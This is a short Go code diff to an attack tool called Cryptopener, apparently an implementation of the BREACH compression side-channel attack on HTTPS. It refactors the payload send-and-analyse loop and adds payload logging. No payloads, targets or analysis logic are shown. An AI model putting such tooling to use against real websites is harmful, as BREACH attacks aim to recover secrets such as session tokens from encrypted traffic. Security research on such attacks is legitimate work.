@@ -32,15 +32,12 @@ func (p *Cryptopener) analyseResponse(response []byte) {
 
 // Run starts BREACH attack
 func (p *Cryptopener) Run() {
-	channel := make(chan []byte, 1)
 	for {
 		// create new payload
 		payload, _ := p.mutator.NewPayload(false)
-
+		log.Printf("Sending payload: %s", string(payload))
 		// send payload into a socket and then response into channel
-		go func (){
-			channel <-p.client.SendMessage(string(payload))
-		}()
-		defer p.analyseResponse(<-channel)
+		response := p.client.SendMessage(string(payload))
+		p.analyseResponse(response)
 	}
 }
